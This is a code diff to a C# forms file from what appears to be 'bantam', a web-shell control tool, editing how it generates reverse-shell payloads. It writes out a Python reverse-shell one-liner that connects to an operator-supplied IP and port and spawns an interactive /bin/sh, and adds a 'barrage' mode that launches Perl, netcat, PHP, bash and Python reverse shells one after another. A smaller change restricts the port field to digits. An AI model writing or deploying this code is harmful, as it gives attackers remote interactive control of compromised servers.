@@ -127,7 +127,7 @@ namespace bantam.Forms
             string pythonShell = "python -c 'import socket,subprocess,os;"
                                + "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                                + "s.connect((\"" + ip + "\"," + port + "));"
-                               + "os.dup2(s.fileno(),0); " 
+                               + "os.dup2(s.fileno(),0);" 
                                + "os.dup2(s.fileno(),1);"
                                + "os.dup2(s.fileno(),2);"
                                + "p=subprocess.call([\"/bin/sh\",\"-i\"]);'";
@@ -181,9 +181,26 @@ namespace bantam.Forms
                     shellCode = PythonShell(ip, port);
                     break;
                 case "barrage":
+                    shellCode = PerlShell(ip, port);
+                    PopReverseShell(shellCode);
 
-                    break;
+                    shellCode = NetCatShell(ip, port);
+                    PopReverseShell(shellCode);
+
+                    shellCode = NetCatPipeShell(ip, port);
+                    PopReverseShell(shellCode);
+
+                    shellCode = PhpShell(ip, port);
+                    PopReverseShell(shellCode);
+
+                    shellCode = BashShell(ip, port);
+                    PopReverseShell(shellCode);
+
+                    shellCode = PythonShell(ip, port);
+                    PopReverseShell(shellCode);
+                return;
             }
+            PopReverseShell(shellCode);
         }
 
         private async void buttonGetIpv4_Click(object sender, EventArgs e)
@@ -197,6 +214,13 @@ namespace bantam.Forms
                 } else {
                     textBoxIP.Text = task.Result;
                 }
+            }
+        }
+
+        private void textBoxPort_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            if (!char.IsControl(e.KeyChar) && !char.IsDigit(e.KeyChar)) {
+                e.Handled = true;
             }
         }
     }
